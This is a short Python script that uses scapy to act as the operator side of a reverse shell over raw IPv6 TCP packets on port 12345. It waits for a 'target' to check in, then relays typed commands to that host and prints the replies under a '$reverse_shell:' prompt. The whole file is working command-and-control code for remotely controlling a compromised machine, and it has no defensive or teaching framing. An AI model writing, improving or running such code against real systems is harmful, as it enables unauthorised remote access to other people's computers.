from scapy.all import *

# listening for connections
def target_client_connection_receiver():
    connection_establishment_command = "CONNECTION_FROM_CLIENT"
    while True:
        # receive connection from target client
        packet = sniff(count=1, filter="tcp and dst port 12345")
        extracted_packet = packet[0]['IPv6']
        try:
            target_IP = extracted_packet.src
            data = extracted_packet.load.decode('utf-8')
            if(data == connection_establishment_command):
                break
        except:
            pass
    
    print("Connection established to target\n$reverse_shell: ", end="")
    return target_IP

# connects to the client being targeted
def send_data(data, target_IP):
    packet = IPv6(dst=target_IP)/TCP(sport=12345, dport=12345)/data
    send(packet, verbose=0)
    receive_data(target_IP)


def receive_data(target_IP):
    response = ""
    while True:
        packet = sniff(count=1, filter= "dst port 12345")
        try: 
            extracted_packet = packet[0]['IPv6']
            if(target_IP == extracted_packet.src):
                try:
                    response = extracted_packet.load
                    response = response.rstrip()
                    response = str(response)
                    first_apostrophe_index = response.index('\'')
                    response = response[first_apostrophe_index + 1 : ]
                    response = response[: len(response) - 1]
                    print(response)
                    if(response == "END_COMM"):
                        break
                except:
                    pass
        except:
            pass
    print("\n$reverse_shell: ", end= "")
    

    
def command_handler(target_IP):
    data = str(input())
    send_data(data, target_IP)


def main():

    # receive connection from target client
    target_IP = target_client_connection_receiver()
    while True:
        command_handler(str(target_IP))

main()